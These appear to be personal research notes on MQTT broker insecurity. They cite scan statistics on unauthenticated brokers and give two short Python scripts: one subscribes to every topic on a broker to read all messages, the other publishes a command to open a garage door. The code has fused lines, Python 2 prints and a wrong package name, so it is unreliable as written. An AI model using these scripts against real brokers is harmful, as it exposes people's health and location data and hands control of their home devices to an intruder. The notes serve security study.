# Notes on MQTT 

References:

- **Info that is used Below:**
  - [Hacking the IoT with MQTT](https://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b)

- **Older Python vuln scan with shodan**

  - [Warflop/IOT-MQTT-Exploit: MQTT vulnerable with shodan (github.com)](https://github.com/Warflop/IOT-MQTT-Exploit)

- **Paper on Fuzzing with MQTT that I haven't read.**

  - [MQTT Security: A Novel Fuzzing Approach (hindawi.com)](https://www.hindawi.com/journals/wcmc/2018/8261746/)

- **Global Portscan (1883) and Vulnerability statistics**

  - [An Internet-wide (IPv4) scan of externally accessible MQTT services – VARIoT](https://www.variot.eu/2020/05/05/312/)

  

We can see that **most MQTT Servers don't even use authentication (almost 70%).** Only 11% of all hosts returned us a "Bad user name or password" code in the CONNACK packet (I wonder if they use default passwords !?).

A summary of some of the open MQTT servers found in the wild:

- Different kinds of IoT devices
- Sensors: Light and temperature values
- Fitness devices: Fitbit
- Health devices: Blood Pressure Monitors
- Location services: Owntracks (really creepy stuff!)
- Home automation kits: SmartThings (Samsung)

## Code

```bash
# deps ### Test if that's right pypi

pip3 install paho.mqtt.client
```

You can connect to a server and subscribe to all topics with a simple script:

```python
import paho.mqtt.client as mqttdef on_connect(client, userdata, flags, rc):
   print "[+] Connection successful"
   client.subscribe('#', qos = 1)        # Subscribe to all topics
   client.subscribe('$SYS/#')            # Broker Status (Mosquitto)def on_message(client, userdata, msg):
   print '[+] Topic: %s - Message: %s' % (msg.topic, msg.payload)client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.on_message = on_message
client.connect('SERVER IP HERE', 1883, 60)
client.loop_forever()
```



![image](https://user-images.githubusercontent.com/64992493/133946955-3c272d3b-6530-421d-8b08-f59fecb4c7b8.png)


![image](https://user-images.githubusercontent.com/64992493/133946963-01bdb7b1-5a08-4e87-a367-b54dab975c75.png)


A Frightening security risk appears when an attacker is able to control IoT devices by publishing commands to a MQTT topic (e.g., turn off the lights and open the garage door). A simple python script to open a fictitious garage door is shown here:

```python
import paho.mqtt.client as mqttdef on_connect(client, userdata, flags, rc):
   print "[+] Connection success"client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.connect('IP SERVER HERE', 1883, 60)
client.publish('smarthouse/garage/door', "{'open':'true'}")
```

